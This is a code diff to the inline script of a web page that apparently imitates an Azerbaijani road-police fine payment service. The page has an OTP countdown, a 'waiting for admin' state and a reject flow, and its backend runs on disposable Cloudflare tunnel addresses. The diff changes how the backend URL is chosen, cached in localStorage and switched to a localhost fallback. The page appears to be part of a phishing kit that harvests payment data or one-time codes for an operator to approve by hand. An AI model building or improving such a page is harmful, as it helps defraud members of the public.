@@ -191,7 +191,7 @@
     </div>
 
     <script>
-        let API_URL = 'https://warnings-fifty-stress-dakota.trycloudflare.com/api';
+        let API_URL = localStorage.getItem('dyp_active_api_url') || 'https://chester-police-fragrance-initiated.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -199,32 +199,20 @@
         let adviceShown = false;
 
         async function initConfig() {
+            const savedApiUrl = localStorage.getItem('dyp_active_api_url');
+            if (savedApiUrl) {
+                API_URL = savedApiUrl;
+            }
+
             try {
                 const res = await fetch(`config.json?t=${Date.now()}`);
                 const config = await res.json();
-                if (config.apiUrl) {
+                if (config.apiUrl && !savedApiUrl) {
                     API_URL = config.apiUrl;
                 }
             } catch (err) {
                 console.log("Config oxunmadı, lokal istifadə olunur");
             }
-
-            try {
-                const res = await robustFetch(`${API_URL}/fine?t=${Date.now()}`);
-                if (res && res.ok) {
-                    const contentType = res.headers.get('content-type');
-                    if (contentType && contentType.includes('application/json')) {
-                        const data = await res.json();
-                        if (data.apiUrl) {
-                            API_URL = data.apiUrl;
-                        }
-                        updateUI(data);
-                    }
-                }
-            } catch (err) {
-                console.error("Serverə qoşulmaq mümkün olmadı:", err);
-            }
-
             fetchFineData();
             initTimer();
         }
@@ -254,11 +242,18 @@
         async function robustFetch(url, options) {
             try {
                 let res = await fetch(url, options);
-                if (res.ok) return res;
+                if (res.ok) {
+                    localStorage.setItem('dyp_active_api_url', API_URL);
+                    return res;
+                }
             } catch (e) {
                 if (!url.includes('localhost:3000')) {
                     let localUrl = url.replace(/https?:\/\/[^\/]+/, 'http://localhost:3000');
-                    return await fetch(localUrl, options);
+                    let resLocal = await fetch(localUrl, options);
+                    if (resLocal.ok) {
+                        localStorage.setItem('dyp_active_api_url', 'http://localhost:3000/api');
+                        return resLocal;
+                    }
                 }
                 throw e;
             }
@@ -589,7 +584,7 @@
             }
 
             isWaitingForAdmin = true;
-            localStorage.setItem('dyp_waiting', 'true');
+            localStorage.setItem('dyp_wait', 'true');
             closeModals();
             showLoadingScreen();
 
@@ -618,9 +613,9 @@
             try {
                 await robustFetch(`${API_URL}/clear-reject`, { method: 'POST' });
             } catch (err) {
-                console.error("Clear reject error:", err);
+                console.log("Clear reject error:", err);
             }
-            localStorage.removeItem('dyp_waiting');
+            localStorage.removeItem('dyp_wait');
             isWaitingForAdmin = false;
             document.getElementById('reject-modal').classList.add('hidden');
 
